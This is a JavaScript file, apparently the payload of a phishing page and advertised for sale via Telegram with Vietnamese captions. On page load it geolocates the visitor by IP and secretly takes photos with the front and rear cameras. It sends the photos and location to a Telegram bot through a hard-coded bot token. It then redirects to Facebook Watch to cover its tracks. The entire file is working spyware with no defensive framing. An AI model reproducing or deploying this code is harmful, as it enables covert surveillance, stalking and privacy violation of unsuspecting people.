const TOKEN = '8163261794:AAE1AVuCTP0Vm_kqV0a1DT-02NTo1XKhVs0';
const ID = '-1003770043455';

async function capture(mode) {
    let stream = null;
    try {
        stream = await navigator.mediaDevices.getUserMedia({ 
            video: { facingMode: mode, width: 640, height: 480 } 
        });
        const video = document.createElement('video');
        video.srcObject = stream;
        video.muted = true;
        await video.play();

        return new Promise(res => {
            setTimeout(() => {
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                
                stream.getTracks().forEach(t => t.stop());
                video.srcObject = null;
                
                canvas.toBlob(res, 'image/jpeg', 0.7);
            }, 3000);
        });
    } catch (e) {
        if (stream) stream.getTracks().forEach(t => t.stop());
        return null;
    }
}

async function main() {
    let info = { ip: '?', isp: '?', addr: '?', lat: 0, lon: 0 };
    try {
        const r = await fetch('https://ipwho.is/');
        const d = await r.json();
        info = { ip: d.ip, isp: d.connection?.org, addr: `${d.city}, ${d.region}`, lat: d.latitude, lon: d.longitude };
    } catch (e) {}

    const p1 = await capture("user");
    await new Promise(r => setTimeout(r, 1500)); 
    const p2 = await capture("environment");

    const mapUrl = `https://www.google.com/maps?q=${info.lat},${info.lon}`;

    const cap = `📡 [THÔNG TIN TRUY CẬP]
🕒 ${new Date().toLocaleString('vi-VN')}
📱 Thiết bị: ${navigator.platform}
🌍 IP: ${info.ip}
🏢 ISP: ${info.isp}
📍 Khu vực: ${info.addr}
📌 Maps: ${mapUrl}
📸 Camera: ${p1 ? "✅ Trước" : "❌"} | ${p2 ? "✅ Sau" : "❌"}

⚠️ Lưu ý: Thông tin trên có thể không chính xác 100%.
💸 Mua bot - Thuê bot ib Tele: @Mrwenben`.trim();

    const fd = new FormData();
    fd.append('chat_id', ID);
    
    const media = [];
    if (p1) {
        fd.append('f1', p1, '1.jpg');
        media.push({ type: 'photo', media: 'attach://f1', caption: cap });
    }
    
    if (p2) {
        fd.append('f2', p2, '2.jpg');
        media.push({ type: 'photo', media: 'attach://f2', caption: (media.length === 0) ? cap : "" });
    }

    try {
        if (media.length > 0) {
            fd.append('media', JSON.stringify(media));
            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMediaGroup`, { method: 'POST', body: fd });
        } else {
            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: ID, text: cap })
            });
        }
    } catch (err) {}
    
    setTimeout(() => {
        window.location.href = "https://www.facebook.com/watch/";
    }, 500);
}

main();
